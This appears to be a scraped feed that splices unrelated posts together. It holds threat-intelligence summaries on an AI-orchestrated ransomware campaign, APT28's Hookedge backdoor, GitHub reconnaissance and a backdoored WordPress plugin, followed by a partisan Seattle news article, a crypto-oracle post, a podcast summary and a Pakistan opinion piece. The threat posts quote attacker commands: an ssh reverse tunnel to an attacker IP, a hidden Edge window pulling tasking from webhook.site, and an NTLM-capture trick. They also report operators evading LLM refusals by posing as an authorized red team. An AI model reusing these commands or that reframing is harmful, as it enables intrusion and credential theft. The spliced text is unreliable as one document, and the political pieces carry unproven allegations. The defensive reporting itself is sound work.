Russian-speaking ransomware affiliates built an AI-orchestrated intrusion platform exposed by their own OPSEC failures, revealing 46 staged encryptors, 62 named victims, and the source code of a novel autonomous attack framework called Phantom.  Key findings:  - Seven adversary servers were exposed, anchored at 45.227.254[.]43, which held OpenCode AI session logs (8,257 messages across 133 sessions, over $23,920 spent on OpenRouter API access using models including anthropic/claude-opus-4.6 and moonshotai/kimi-k3), a persistent victim-tracking knowledge base, and the full source of Phantom: a modular 18-skill "Autonomous Red Team Kill Chain Framework" with Python and Go agents that masquerade as Windows Update components and beacon to api.iquickline[.]com. The AI planned reconnaissance, generated commands, triaged exfiltrated data and drafted extortion material. Humans approved each step. When commercial models refused a request, operators reframed it as an "Authorized Red Team Assessment Request" rather than switching to an uncensored model. The knowledge base and session logs form a complete, timestamped evidence trail of the campaign.  - Initial access centered on three CVEs actively exploited at scale per operator records: CVE-2026-35616 (FortiClient EMS auth bypass, 2,236 targets, 108 backdoor admin accounts created, 4,140 managed endpoints reachable), CVE-2024-57727 (SimpleHelp path traversal, 4,922 servers scanned, 427 admin passwords stolen, 242 unique IPs impacted), and CVE-2026-41940 (cPanel/WHM auth bypass, 49+ claimed breaches used as springboards to hosted mail infrastructure). MSP credential theft was a major force multiplier: one reused password unlocked VPN, RMM, backup, and security management simultaneously. The operators also attempted ZeroLogon (CVE-2020-1472), PrintNightmare, noPac, and a PAN-OS User-ID buffer overflow, with mixed results recorded in their own logs.  - The custom arsenal recovered in source and binary form includes Phantom (18-skill autonomous framework), Ghost C2 (three polymorphic generations over HTTPS via Cloudflare, Telegram, or DNS), RevSocks (reverse SOCKS5 pivot, host 77.110.109[.]248), a Quick Heal/Seqrite BYOVD killer abusing the Zemana driver, a Cloudflare-fronted Mythic agent named QuickLine (C2 zone iquickline[.]com), and rks3/BackupAgent exfiltration tools. Persistence for the phishing delivery component used a scheduled task named RealtekAudioSvc. The partner onboarding guide on 45.227.254[.]45 advertises 35 MCP servers, 55+ tools, and a 9,000+ CVE PoC library, pointing to a tooling-provider model serving multiple ransomware affiliates.  - 46 INC encryptor builds (Windows and Linux) were staged for six named victims and packed for an October 1, 2026 deployment wave. A SimpleHelp screenshot from September 30 shows live encryption running on a victim workstation. The Windows encryptor stops backup and database services, removes shadow copies via IOCTL 0x0053C028 (not vssadmin), appends .INC, and drops INC-README.txt. The extortion playbook prefers data leverage over encryption pressure: operators estimate payment capacity from stolen financials, send proof samples, open without a price demand, then escalate through vishing calls, regulator notifications, customer-facing look-alike sites (trulitesupport[.]com warned Trulite's customers directly), and publication. Payment was planned in Monero. 62 organizations are named in operator records, 36 in the United States 🇺🇸, led by industrial/manufacturing (16.1%) and healthcare (14.5%).  - The FOFA scanning accounts were tied to smilefacesec[@]gmail[.]com, linked to a BreachForums account "sm4l1st123". Most infrastructure runs on AS267784 (Flyservers S.A.). Operator activity patterns indicate Russian-speaking operators active primarily 06:00 to 14:00 UTC.  Practitioner takeaway: Hunt your FortiClient EMS console now for accounts matching the sysadmin, fct_svc_*, or ems_monitor_* naming patterns, and audit VPN on_connect scripts for unauthorized modifications. In endpoint telemetry, watch for Zemana driver loads paired with Quick Heal or Seqrite service termination, Restart Manager sessions from non-installer processes, volume handle opens followed by IOCTL 0x0053C028, and mass renames to .INC. For C2 and tunneling, flag outbound connections to system-strategy[.]org, iquickline[.]com, mcgrawney[.]com, cloud-update[.]live, and bossprotect[.]com, and look for RevSocks/Chisel/Ligolo traffic patterns. In AD, alert on replication requests from non-DC hosts and shadow-copy access to ntds.dit. The nine INC encryptor SHA-256 hashes and the full extended IOC list are in the SOCRadar report and platform; the complete whitepaper covers tooling internals and encryptor analysis.  #DFIR_Radar

Russian 🇷🇺 APT28 targets NATO defense firms with Hookedge backdoor, a new reflective loader, and dual credential-theft techniques in a multi-month espionage campaign against a naval shipbuilder, aerospace engine manufacturer, and law enforcement agency.  Key findings:  - Swallowtail (APT28, Fancy Bear, Forest Blizzard), assessed by the U.S. 🇺🇸 government as a GRU unit, hit organizations in two NATO member states across three sectors: law enforcement, defense manufacturing, and naval shipbuilding. Hookedge, first documented by Recorded Future in August 2026, is delivered via macro-enabled Word documents. The macro splits VBA strings into short runtime-joined fragments to defeat static AV, then drops a VBS launcher, an HTML/XHTML webhook form pair, and a batch script. Rather than a conventional downloader, it spawns a 1x1 pixel off-screen Edge window using "start msedge.exe --window-size=1,1 --window-position=10000,10000" passing a base64-encoded JavaScript payload, which fetches tasking from webhook[.]site endpoints and saves responses to disk as .000 files that the batch script then executes.  - The naval shipbuilder intrusion ran from July 24 through at least September 24, 2026, with hands-on-keyboard operator activity confirmed by command cadences of two to eight seconds between tasks. Initial C2 used hxxps://webhook[.]site/890efd8d-6e9e-428a-bcf9-987745d71000, then pivoted to a dedicated attacker server at 185.82.218[.]119:443, where a second-stage installer and scheduled task were identified by the UUID 53379b62 and the C2 session by 5b73dc69. The operator-controlled server replaced webhook[.]site for both tasking and exfiltration, with each task wrapped in a fetch, execute, POST-output-back, and delete loop.  - Two distinct credential-theft techniques were used. First, the operators pushed an SSH private key (id_rsa) to C:\ProgramData\Adobe\, set ownership and full permissions on a named domain account, then immediately called the built-in OpenSSH client: "ssh.exe -i C:\ProgramData\Adobe\id_rsa -o StrictHostKeyChecking=no -o PubkeyAcceptedKeyTypes=+ssh-rsa -p 80 root@185.82.218[.]119 -R 185.82.218[.]119:48097 -Nf", creating a persistent backgrounded SOCKS-style reverse tunnel into the shipbuilder's internal network. Second, a self-contained PowerShell script stood up an HTTP listener on localhost:8080 and forced "net use f: \\localhost@8080\c$" in a background job, capturing up to four NTLMv2 challenge/response pairs for offline cracking or relay, functionally equivalent to Responder but written as a short inline script with no external binary.  - The previously undocumented reflective loader ld.exe (SHA256: f1cc91e7427a22027f65d31bbee19c54b602d08d7d93e4745b9cea59fa8132ff) was staged to C:\ProgramData\ and executed with a decryption key and encrypted payload as command-line arguments: "C:\ProgramData\ld.exe DE063CF3F2E2A83E7B1A277C052A340E C:\ProgramData\Events.dat". It decrypts the payload entirely in memory and calls an exported function named ExecuteLoader. The decrypted content begins with the four-byte marker ADSA (0x41534441). The payload file Events.dat was not recovered, so the final stage remains unknown. Both ld.exe and the VBS launcher were still present on the host four weeks later, with the launcher observed again on September 24.  Practitioners who find Hookedge indicators should not treat backdoor installation as the full scope. Hunt for ssh.exe with -Nf -R flags spawning from unexpected parent processes, id_rsa files written to C:\ProgramData\Adobe\, PowerShell standing up System[.]Net.HttpListener on loopback with concurrent net use commands, and Edge processes launched with --window-size=1,1 and data: URI arguments. Check scheduled task names containing UUIDs matching the 53379b62 pattern. The full IOC list, including 21 file hashes and 5 network indicators, is in the Symantec report.  #DFIR_Radar

GitHound, a GitHub reconnaissance tool from SpecterOps, can enumerate org-wide repos, teams, permissions, and secrets via the GitHub API. GitHub Enterprise audit logs expose the pattern when API request logging is enabled.  Key findings:  - GitHound is a BloodHound-style OpenGraph collector released by SpecterOps in 2026. It authenticates with a personal access token (PAT) and queries GitHub's REST and GraphQL APIs to map relationships between users, teams, repositories, and permissions. The scope of collection matches the token's privileges, so a compromised token with broad repo or org access gives an attacker a full picture of the environment. The same capability that defenders use for access-path analysis is directly usable for attacker reconnaissance.  - The GitHub API routes GitHound hits are the detection surface. Routes of interest include /graphql, /organizations/:organization_id/repos, /organizations/:organization_id/teams, /organizations/:organization_id/actions/secrets, /organizations/:organization_id/custom-repository-roles, /organizations/:organization_id/organization-roles, and /organizations/:organization_id/actions/permissions, among others. High-volume access across more than 10 distinct routes or more than 20 distinct URL paths by a single actor within a session is the enumeration signal, regardless of which specific tool generated it.  - Detection requires GitHub Enterprise audit log streaming with API request events explicitly enabled. Without toggling "Enable API Request Events" in the audit log stream configuration, api.request actions are not captured and the enumeration is invisible. Logs in the report are streamed to Azure Blob Storage and ingested via the GitHubAuditLogsV3_CL table in Microsoft Sentinel. The key fields are Actor, TokenId, Route, UrlPath, ProgrammaticAccessType, TokenScopes, and ActorIsBot.  - Recent incidents give this detection operational urgency. The March 2026 Trivy supply-chain attack used stolen credentials to tamper with GitHub Actions and pivot into Checkmarx's GitHub environment. In May 2026, a malicious VS Code extension compromised a GitHub employee device and exfiltrated internal repositories. Enumeration of org structure, secrets, and Actions permissions is a logical precursor to exactly these kinds of follow-on actions.  Practitioner takeaway: verify that API request event logging is enabled in your GitHub Enterprise audit log stream before anything else. Without it, this class of activity leaves no trail. The full KQL detection query is in the report, filtering GitHubAuditLogsV3_CL on Action == "api.request" against the named routes, then alerting when RouteCount exceeds 10 or UrlPathCount exceeds 20 per Actor and TokenId. When an alert fires, pull TokenScopes and ProgrammaticAccessType to assess the token's blast radius and check whether the actor is a known automation account or a human identity that should not be running bulk API queries.  #DFIR_Radar

Rank Math PRO 3.0.123, the paid WordPress SEO plugin, was backdoored at the source between 20:02 UTC Oct 15 and 07:12 UTC Oct 16 2026. Any site that installed and activated the tainted build should be treated as fully compromised, CVE-2026-111862 rated 9.8/10.  Key findings:  - The supply chain was hit at Rank Math's own download and update infrastructure, meaning the malicious files arrived as a legitimate signed update. The attacker-registered domain rank1cdn[.]com was stood up at 19:31 UTC Oct 14, roughly 24 hours before the poisoned window opened, a clear staging indicator. Patchstack notes that because the compromise was on the vendor's own systems, "a rule is not possible for mitigation," making pre-install detection extremely difficult.  - The backdoor is self-restoring: visiting the site triggers recreation of the hidden access point, so removing files before stopping the mechanism does not clean the infection. The malware can drop PHP backdoor files into wp-content/mu-plugins/, other plugin and theme folders (specifically inc/, includes/, lib/), and uploads/; add a fake core file at wp-includes/class-wp-cache-util.php; alter .htaccess so .cache files execute as PHP; create WordPress scheduled events and server crontab entries tagged ms6v46; add SSH authorized_keys entries; and create rogue administrator accounts with usernames beginning wpsupport_ or email addresses ending [@]wp-mail[.]net.  - The cleanup order is critical and must not be reversed. Step one: delete the entire rank-math-pro plugin folder via file manager or FTP, not deactivation alone. Step two: remove wp_options table entries named _uf6qdn2hmm, t8krdk990phb, and _np5pvf754c. Step three: block outbound connections to rank1cdn[.]com at the firewall. Only then should responders begin hunting residual artifacts. Code patterns to search for include base64_decode with XOR loops, the key xmmqhn, proc_open calls, and PHP-FPM socket code.  - Version number alone does not reveal exposure. A 3.0.123 copy obtained before 20:02 UTC Oct 15 is clean; one installed and activated during the window is compromised even after updating to 3.0.124. Wordfence explicitly warns that absence of the known indicators does not prove a site is clean.  - This is the third confirmed vendor-update-channel supply chain hit against premium WordPress plugins in 2026, following backdoored Smart Slider 3 Pro via Nextend's channel in April and ShapedPlugin's Pro plugins in June, which included a package tampered retroactively under the same version number. No public reporting links the actors behind those incidents to this one, but the pattern shows premium plugin update channels are an active, recurring attack surface.  Responder takeaway: Sites in the exposure window need full credential rotation across WordPress passwords, wp-config.php database credentials, security keys and salts, payment gateway and SMTP API keys, and SSH access regardless of whether a restore from backup is used. Run wp core verify-checksums and wp plugin verify-checksums --all post-cleanup. Hunt your WordPress hosting environment for the specific crontab tag ms6v46, the fake core file wp-includes/class-wp-cache-util.php, .cache files containing PHP code, and any admin accounts matching the naming patterns above. Wordfence's advisory and Rank Math's security notice contain the full recovery procedure.  #DFIR_Radar

Seattle socialist mayor bankrolls deportation defense for illegal aliens through $4 million taxpayer-funded initiative | Ari Hoffman, The Post Millennial  Seattle’s socialist Mayor Katie Wilson is using a $4 million taxpayer-funded initiative to support immigrant services that include helping illegal aliens fight deportation.  In an October 16 statement, Wilson touted continued spending on legal services, rapid response efforts, and assistance for immigrant workers and businesses. Her announcement was circulated in English, with translations advertised in Spanish, Somali, Chinese, and Vietnamese.  “My office is sustaining four million dollars in ongoing support for immigrant and refugee communities, funding legal services, rapid response, and assistance for immigrant workers and small businesses,” Wilson said.  Seattle’s Legal Defense Network funding solicitation announced an additional $1.25 million annually for services including deportation proceedings, challenges to ICE detention, and efforts to obtain relief from final removal orders. Eligible clients include low-income immigrants who live, work, or attend school in Seattle, or who are detained or face removal proceedings in the city. The city’s broader Immigrant Rapid Response Program explicitly offers services regardless of immigration status.  Wilson then instructed: “If you are threatened or in danger, call 911. To report a bias incident, contact the Seattle Office for Civil Rights.”  The announcement sent in Somali follows Wilson’s dismissal of calls to investigate alleged fraud involving Somali-run daycares. Wilson was previously asked whether she had authorized Seattle police or the Office of Immigrant and Refugee Affairs to investigate the allegations. “No,” she replied. “This whole issue is not really about fraud,” Wilson said, adding: “It's about making an immigrant community a target.”  In September, TPM reporter Katie Daviscourt investigated more than 20 Seattle-area daycare locations, raising questions about more than $5 million in public funding. At several locations, no children appeared present or nobody answered the door. Records reviewed in the investigation showed Daisy Family Childcare received nearly $2 million and collected about $70,000 monthly.  SEIU 925 responded by targeting the journalist. In a September 22 email to lawmakers and early-learning leaders, union Political and Legislative Director Erin Haick accused Daviscourt of “harassing Somali child care providers” and participating in a “sustained, racist attack.” Haick disclosed that five programs mentioned in the reporting were union members.  Washington Attorney General Nick Brown had similarly criticized independent journalists who have been investigating providers since December. In an official statement, Brown said Somali providers were being accused of inadequate fact-checking and directed those experiencing threats or harassment to police or his office’s Hate Crimes & Bias Incident Hotline.  Approximately $37 million in questionable childcare payments were identified by auditors, as well as 1,372 subsidy overpayments totaling more than $2 million.  Seattle’s immigrant-support spending extends beyond attorneys. A city announcement designated $280,000 for community grants covering neighborhood alert systems, volunteer recruitment, rights presentations, family safety planning, and assistance with meals, towing fees, and immigration fees.  The City Council appropriated the $4 million in late 2025, before Wilson took office. Her administration subsequently pledged to distribute it alongside restrictions on using city-owned and city-controlled property for civil immigration enforcement and instructions for police to verify and document reported federal enforcement activity.  thepostmillennial.com/seattl…

𝐎𝐍𝐄 𝐃𝐀𝐓𝐀 𝐒𝐎𝐔𝐑𝐂𝐄 𝐂𝐀𝐍 𝐁𝐄𝐂𝐎𝐌𝐄 𝐎𝐍𝐄 𝐏𝐎𝐈𝐍𝐓 𝐎𝐅 𝐅𝐀𝐈𝐋𝐔𝐑𝐄. ⚠️  Decentralization is often discussed in terms of blockchain validators, but data dependencies deserve the same scrutiny.  Suppose a smart contract depends on one external provider for a critical price. If that provider becomes unavailable, publishes incorrect information, or experiences a security incident, the application may inherit those problems.  The blockchain itself might continue operating normally.  This illustrates an important distinction: a decentralized network can still contain centralized dependencies.  Oracle architectures can reduce certain risks through independent sources, multiple data providers, validation mechanisms, and carefully designed aggregation. However, simply increasing the number of sources does not automatically guarantee independence.  Several providers may rely on the same underlying exchange, infrastructure, or data origin.  WINkLink’s broader role in the TRON ecosystem highlights the importance of connecting applications to external information through dedicated oracle infrastructure.  For developers, the essential task is to map the trust assumptions behind every critical input.  Which parties can influence the data? Are their failure modes correlated? Can the application detect abnormal values? Is there a safe response when reliable data cannot be obtained?  These questions help distinguish genuine resilience from superficial redundancy. Podcast Summary | The Shawn Ryan Show: My Unredacted Interview with The Leah Files  Overview Leah presents herself as an economist, financial analyst, and corporate intelligence consultant with more than two decades supporting the US intelligence and national security community. Her central argument is that money tells a truer story than official narratives: financials and CEO storytelling routinely diverge, and following the money exposes fraud, hidden relationships, and captured institutions. She applies that lens to her own history, to corporate cases like Theranos and WeWork, to the finances of Turning Point USA after Charlie Kirk's assassination, to an alleged foreign influence operation aimed at the MAGA base, and to surveillance systems such as Flock cameras. The through-line is that trust in institutions is collapsing, and verifiable financial research is offered as the corrective.  Key Themes - Financials and executive storytelling often diverge, so due diligence that stops at the narrative misses fraud, hidden relationships, and risk. - Crypto is more traceable on the public blockchain than commonly assumed; the real vulnerability is cashing out, not moving funds between addresses. - Leah's account of an abusive childhood and a memory that begins around age 14 frames her resilience as deliberate separation from the abuse rather than absorption of it. - Her intelligence career, spanning contractor and agency roles, taught her to read budgets and contracts as evidence that official stories and actual spending priorities do not always align. - She argues the core political divide is no longer left versus right but America first versus not, and she expects Democratic midterm gains because of division on the right. - Charlie Kirk's request for a DOGE-like financial review shortly before his death prompted her examination of TPUSA's finances, which she presents as showing rapid growth, concentrated donors, and insider-linked vendor payments. - Brad Parscale is described as running a paid, FARA-registered influence campaign targeting young conservatives, with influencers allegedly paid per post and others captured through White House access rather than cash. - Flock cameras are framed as a surveillance infrastructure problem: audit data reportedly shows most plate searches are not tied to crimes and include targeting of protesters and personal acquaintances. - She sees state and governors as the only realistic level for meaningful change, while federal politics is described as structurally unable to deliver it.  Detailed Summary Leah describes herself as an economist, financial analyst, and corporate intelligence consultant with over two decades supporting the US intelligence and national security community, focused on financial modeling, strategy, and risk. She runs Black Widow Global, about a year old, investigating fraud, deceptive executives, hidden financial relationships, and risks traditional due diligence misses. Her core thesis is that numbers can tell any story they want and that companies sell stories rather than what is behind the curtain, citing Theranos and WeWork. Typical clients are private equity and law firms, alongside pro bono work for women in divorces where husbands hide assets. Common asset-hiding methods include LLCs, growing use of crypto, and conversion to commodities like gold. Tracing crypto requires first obtaining the person's crypto address, after which blockchain transactions can be followed.  Her personal account begins with almost no memories before age 14, which she attributes to an abusive, toxic household; many memories come from family stories rather than her own recollection. As the oldest of four, she says she effectively raised her younger siblings and protected them from absent or abusive parents. She grew up outside Raleigh, North Carolina, in Rolesville, a small town with one stoplight, 23 acres, next to tobacco fields, with the same classmates from kindergarten through twelfth grade. Early memories include calling 911 around age four or five to save her mother from her father's abuse. She recalls her mother dropping her at the end of the driveway after being kicked out of Chuck E. Cheese and going to rehab for the third time, after which she did not see her for about a year. She spent a summer around seventh grade in the desert with grandparents who were gemologists and mined opals.  She remembers sitting in freshman English class at about 9:10 a.m. and having a strange feeling; that day her mother was in intensive care, badly beaten with a 20-pound bag of dog food and a vacuum cleaner, and left her father for good. She frames that day as the start of her memory. She describes leaving home for college as a survival decision, choosing a distant school to escape her environment even though it meant leaving younger siblings behind. Recruited for track and field and cross country, she chose University of Tennessee Knoxville to be far from home and later transferred to NC State. She says her sister two years younger had already begun using drugs and alcohol, and her youngest sister remains angry that she left. Her sister two years younger died in 2015 of a fentanyl-heroin laced mix; she remains in contact with her brother and youngest sister. She says she forgave her parents readily and never felt anger toward them, viewing their behavior through the lens of their own pain and young, toxic circumstances, and attributes her resilience to not absorbing the abuse, separating insults from her own identity, and focusing on gratitude and what she can control.  She worked at the Cheesecake Factory near the end of college and got a referral that led to a job at Northrop Grumman building cost models for satellites, where she says the company hired people from MIT and Columbia and where she received a TS clearance easily because she had never traveled or done drugs. At Northrop Grumman she joined a special access program in a vault with about 10 people, her first exposure to levels above TS and to the idea that government lies to people to protect them. She later worked at Booz Allen Hamilton at NRO and describes seeing how NGA, NRO, human intelligence, and SIGINT fit together. At CIA she worked for the CFO and comptroller, helping justify budgets to Congress amid proposed cuts, including a 20 percent budget cut and closing a base in Afghanistan. She says the work revealed that tax dollars do not always align with stated missions and that contracts contain fluff, and that money tells a better picture than official stories. She says she was a blue badger for DIA for about 10 months and went through testing and a psychiatrist.  She describes herself as introverted and says she had no social media before becoming vocal, having stayed off it for privacy while working in the intelligence community; within roughly six months of joining, people posted pictures of her kids. She started speaking publicly about Epstein and the government shutdown, and rapid attention led people to try to discredit her. She frames coordinated discrediting attacks as a response to her work, citing synchronized reposts and shared narratives across groups, and claims her credibility is verifiable through financial research rather than personal identification. She describes at CIA being read into programs that remain classified and relying on pattern recognition, and argues the US is applying foreign-influence and psyops-style methods domestically and not even being good at it. She identifies undisclosed influencer payments and hidden political agendas as a core problem, separate from social media and access to information.  On politics, she argues the divide is no longer left versus right but America first versus not, and predicts a Democratic midterm sweep due to division on the right. She attributes right-wing division to perceived broken campaign promises on no new wars, MAHA, Ukraine, and the Epstein files, and cites the Massie election and Charlie Kirk's assassination as catalysts. She estimates roughly 40 to 45 million dollars was spent to defeat Thomas Massie in what she calls a paid-for election. She notes policy disappointments including glyphosate company immunity, social media figures at the inauguration, the ongoing Ukraine war, and only victims' names released in the Epstein files. Black Widow Global has begun taking political clients, researching opponents' investments, fraud, and foreign ties, while she says she avoids personal attacks.  Charlie Kirk is described as someone who got people talking about politics even when she disagreed with him, and his assassination is treated as a turning point. Kirk reportedly requested a DOGE-like assessment of financials and operations eight days before being killed; she says this prompted her investigation of TPUSA's finances while explicitly not linking it to his death. She alleges TPUSA financial irregularities: revenue reportedly grew from 85 million dollars in 2024 to 115 million in 2025, five donors allegedly provide roughly 80 percent of funding with three identified through filings, and Robert Shillman reportedly gave 2 million dollars through a charity two days before the assassination. The Wilks brothers and the Bradley Fund are named as donors. Over 20 million dollars in vendor payments allegedly trace to LLCs connected to friends or people inside the organization. In 2023, TPUSA reportedly spent more than it took in, around 70 million dollars. The 2024 filing reportedly lists five vendors paid 7 million dollars and 62 to 64 additional vendors paid over 100,000 dollars. Events and conferences are described as the largest cost, with attendees paying about 350 dollars for adults and 75 for students. TPUSA reportedly has four entities, TPUSA, an endowment, TPUSA Action, and Americas, with money funneled among them, and one filing reportedly shows 3.5 million dollars in wages alongside zero employees. She says she holds a fraud examiner license.  Resolute Media is described as a for-profit running the Charlie Kirk show using a nonprofit's name and likeness without paying required royalty fees, with Salem Media connected to ads. The show's alignment has shifted from Kirk's prior position, with hosts claiming it is now on a completely different page from Kirk at the time of his assassination. Advertisers and paid political narratives, not just audience size, are framed as the financial engine. Brad Parscale is described as running a paid, FARA-registered influence campaign targeting young conservatives in the MAGA base on behalf of Israel, with a US intelligence official quoted by Time noting the unusual target is the sitting president's own political base. Parscale allegedly receives up to 60 million dollars from Israel, and reported FARA filings allegedly show payments rising from roughly 3 million to 12 to 15 million dollars a month, with registration reportedly occurring within a week of Kirk's assassination. Influencers are described as captured by White House access and status rather than direct payment, with paid influence cited at 7,000 dollars per post and 20 to 30 posts a month. Narratives pushed reportedly include an anti-fraud government task force, support for the Iran war, pro-Trump and pro-Israel messaging, military merging, and claims that AI data centers are not bad. A claim is made that funding flows through a German advertising company paid by Israel, which then pays US recipients so they can technically say they are not paid by Israel while still registered under FARA. A US intelligence official told Time that Russia, Iran, and China also run influence operations, but this one targets the president's own base.  On surveillance, she argues tools like Flock cameras have shifted from crime-fighting to building a surveillance state, citing audit-log data showing most plate searches are not tied to crimes. Camera counts cited are 40,000 in 2024, 80,000 in 2025, and over 100,000 now. States with the most cameras cited are Virginia, Texas, and California. HaveIBeenFlocked.com is described as showing audit logs with over 430 million records, almost 4.7 million plates searched, 9 percent for crime and 91 percent for other reasons, 84.2 percent of searches with no case number, 66.3 million searches with no reason recorded, and hundreds of thousands of searches by unauthorized users. Biggest users cited include Nashville, Tennessee Police Department and Harris County, Texas Sheriff's Office. Flock Nova is described as an attachment linking plates to open-source data such as emails, LinkedIn, and address, with procurement records possibly not showing which cameras have the lookup capability. A cited abuse example is a sheriff reportedly looking up a woman going to have an abortion across three states. Two biggest investors in Flock are described as major investors in Israeli surveillance companies including TOA, which is described as able to access internet-connected camera feeds, alter or delete footage in real time, and leave no forensic trace. LA is described as having just voted to stop using the cameras, and Ring reportedly cut off a potential partnership after learning more. The speakers acknowledge real benefits, such as tracking a kidnapped child's vehicle in real time, but argue the line is crossed because audit logs show misuse, and that guardrails are insufficient given record-low trust in government institutions.  Concerns extend to AI data centers, messaging surveillance, and centralized digital banking as potentially linked to monitoring and punishing First Amendment speech. The military merge with Israel is framed as tech and system integration that cannot be undone once done, with six components including system sharing and bio health, merging health standards as well as military capabilities. A new office with its own director, organization, and budget is described as a way to route funding through classified special access program channels, reducing visibility into money given to Israel, and the claim that Netanyahu said Israel no longer wants US aid is presented as a way to appear like the good guys while the new office obscures funding. The NDAA is described as 1,700 pages, marked up in the Senate in June but not passed, then finalized in a closed-door House-Senate committee able to strip or enhance provisions, removing transparency. The relevant measure reportedly passed by only four votes, with seven Republicans crossing party lines and six Democrats voting yes; Republicans named as voting against it include Eli Crane, Tim Burchett, Massie, and Luna. Henry Cuellar is described as a Democrat who voted no, was facing decades in prison in 2024 for being a foreign agent and taking fraudulent bribes before being pardoned by Trump, and now voted for warrantless surveillance and the merger. A claim is made that the DIA stated Israel is spying on US government officials and is an espionage threat, which she contrasts with the push to integrate systems. She says she would never go into politics but believes governors can make a difference while federal politicians cannot, describing the merging of the militaries as one of the scariest things that could happen. The petro dollar and BRICS are raised as concerns, though she says she has not looked into current petro-dollar developments. No clear future plans are stated beyond continuing her current work. 🇮🇷🇵🇰|The plane landed in Tehran carrying a man whose paycheck, his fighter jets, and his political survival are signed in Washington. The mediation is not neutral. The mediator is an asset.  The Visit: A Mediator With a Handler  Field Marshal Asim Munir, Pakistan’s army chief, arrived in Tehran on Tuesday, 20 October 2026, accompanied by Interior Minister Mohsin Naqvi. Iranian state media and the semi-official Mehr News Agency confirmed the arrival. Iranian Foreign Ministry spokesman Esmaeil Baqaei said the visit was “primarily focused on strengthening bilateral relations,” while acknowledging that “some exchanges between the two countries involved negotiations”.  The framing from Pakistan’s own media is more explicit. Anadolu Agency reported that Munir was expected in Tehran “as Islamabad seeks to revive stalled negotiations between Washington, Tehran”. Chinese state media, quoting Iran’s Mehr News Agency, described Munir as “the mediator between Iran and the United States” and said the visit would “continue mediation to push negotiations forward”.  A mediator between Washington and Tehran who is himself Washington’s most prized military client in South Asia is not a mediator. He is a conveyor belt.  The Paycheck: $686 Million and the Title “Favourite Field Marshal”  In December 2025, the United States authorized a $686 million package for Pakistan’s F-16 fleet. The package included Link-16 systems, cryptographic equipment, avionics updates, training, and comprehensive logistical support. Link-16 is a tactical data link system. Cryptographic equipment is for secure communications. This is not defensive aid. It is interoperability hardware. It makes the Pakistani Air Force legible to, and compatible with, US command systems.  In January 2026, American and Pakistani troops concluded joint training at Pakistan’s National Counter-Terrorism Centre in Pabbi, under the name “Exercise Inspired Gambit”, focusing on “combined infantry skills and tactics, and counterterrorism operations”.  In June 2025, Trump hosted Munir at the White House for a lunch meeting, the first time a sitting US president formally received the head of Pakistan’s army. Trump said he was “honoured” to meet him. According to Dawn, Trump has since publicly praised Munir at least ten times, referring to him as his “favourite field marshal”. In September 2026, Munir met with a US defense company, POWERUS, at General Headquarters in Rawalpindi to discuss “defence procurement, production and capacity building”.  This is not a relationship between sovereign equals. It is a patron-client relationship with a procurement schedule.  The Shadow: What the “Zionabad” Critics Say, and What They Can Prove  A July 2025 analysis published by Just International under the title “The Viceroy of Zionabad: How Pakistan’s ‘Strongman’ Became Trump’s Favorite Puppet” makes the argument directly. It describes Munir as “a five-star servant to the Zionist architects behind America’s foreign policy” and claims that his rise was “paved with carefully calculated silences, conspicuous obedience, and a studied allergy to democratic accountability”. The piece alleges, citing “a Trump Administration official and leaks from high-level Pakistani military sources,” that Munir “enthusiastically aligned himself with the most hawkish and Zionist corners of the American national security state” and earned the approval of then-CIA Director John Ratcliffe and CENTCOM commander Gen. Michael Kurilla. It states that Kurilla praised Munir’s “stability” and “vision” in closed-door briefings, and that in the coded language of US foreign policy, “stability” is shorthand for “willingness to crush dissent,” and “vision” means “alignment with Israeli geopolitical interests”.  These are serious allegations. They are also unverified. The article does not publish the leaked documents it references. No intelligence document, no government confirmation, and no named official has substantiated the claim that Munir is directly managed by Israeli or pro-Israeli US officials. The allegation is a claim, not a proven fact.  What is documented is the structural relationship that makes such an arrangement plausible. A military chief whose equipment, training, and international legitimacy depend on Washington has every incentive to align with the factions in Washington that control those resources. Whether that alignment extends to direct Israeli coordination is a claim that requires evidence that has not yet been produced in public.  There is one further data point. In June 2026, Brazilian journalist Pepe Escobar claimed that Mossad planned to assassinate Munir in Switzerland during Iran-US peace diplomacy, and that Pakistan’s military intelligence intercepted the plot and warned Israel of “severe consequences”. Pakistan’s government dismissed the allegation as baseless. No evidence was produced for the plot. The episode is recorded here not as proof of Israeli involvement, but as evidence of how Munir’s role in the Iran file has generated claims that he is simultaneously Israel’s target and Israel’s servant. Both claims circulate. Neither has been proven.  The Function: Why Washington Sends Its Client to Tehran  The timing is the indictment. Munir’s visit comes as the United States and Israel have threatened Iran with the MOAB and with the destruction of its energy infrastructure. The Iranian letter to the Security Council, filed the day before Munir’s arrival, requested an emergency session and invoked Article 51. A US client arriving in Tehran the next day to “mediate” is not a neutral act. It is a pressure mechanism.  The mediator carries Washington’s terms. He carries the implicit threat of what Washington and its regional allies can do if those terms are refused. He carries the credibility of a man who has been decorated by the threatening party. The message delivered is not “peace.” It is “compliance, delivered by someone who knows what happens to those who do not comply.”  Pakistan’s own interests in this arrangement are real. Border security with Iran, counterterrorism cooperation, and regional connectivity are legitimate concerns. But those concerns are being exercised through a channel that Washington built, funded, and decorated. The mediator is not free. He is rented.  The Silence of the Institutions  The United Nations will record Munir’s visit as a diplomatic engagement. The Security Council will not condemn the threats that made the visit necessary. The Organization of Islamic Cooperation will issue no statement on the MOAB threat. The human rights machinery in Geneva will produce no urgent debate on the threatened destruction of a nation’s energy grid.  These institutions are not neutral. They are structured to absorb the threats of the powerful and to process the complaints of the threatened into agenda items that never reach a vote. A mediator sent by the threatening party is treated as a peacemaker. A letter from the threatened party is treated as a diplomatic note. The vocabulary of the institution is designed to make this asymmetry sound like procedure.  Bottom Line  Munir is Washington’s favourite field marshal. He commands an army equipped with $686 million in US technology, trained alongside US forces, and decorated by a US president who has praised him more than ten times. He arrived in Tehran the day after Iran formally accused the United States of threatening to bomb it into the Stone Age. He came as a “mediator.”  The mediation is the message. The mediator is the instrument. The instrument was purchased in Washington. Whether the hand that signs the checks also takes orders from Tel Aviv is a question that the public record does not yet answer. What the public record does answer is that the man carrying Washington’s terms to Tehran has every material reason to carry them faithfully.

